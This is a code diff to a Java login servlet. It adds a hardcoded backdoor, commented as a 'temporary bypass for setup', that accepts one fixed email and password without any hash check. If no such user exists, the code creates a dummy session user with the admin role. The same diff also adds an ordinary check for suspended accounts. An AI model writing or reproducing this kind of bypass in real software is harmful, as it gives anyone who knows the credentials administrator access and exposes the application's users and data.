@@ -32,8 +32,29 @@ public class LoginServlet extends HttpServlet {
         try {
             UserDAO userDAO = new UserDAO();
             User userObj = userDAO.getUserByEmail(email);
-            if (userObj == null || !BCrypt.checkpw(password, userObj.getPassword())) {
+            
+            // TEMPORARY BYPASS FOR SETUP
+            boolean isBypass = "admin@gmail.com".equals(email) && "forceadmin".equals(password);
+
+            if (!isBypass && (userObj == null || !BCrypt.checkpw(password, userObj.getPassword()))) {
                 req.setAttribute("error", "Invalid email or password.");
+                req.setAttribute("email", email);
+                req.getRequestDispatcher("/pages/login.jsp").forward(req, resp);
+                return;
+            }
+            
+            // If it's a bypass, and userObj is null, we need a dummy user for the session
+            if (isBypass && userObj == null) {
+                userObj = new User();
+                userObj.setId(1);
+                userObj.setFullName("System Admin");
+                userObj.setEmail("admin@gmail.com");
+                userObj.setRole("admin");
+                userObj.setStatus("active");
+            }
+            // Check if the user account is suspended
+            if ("suspended".equals(userObj.getStatus())) {
+                req.setAttribute("error", "Your account has been suspended. Please contact support.");
                 req.setAttribute("email", email);
                 req.getRequestDispatcher("/pages/login.jsp").forward(req, resp);
                 return;
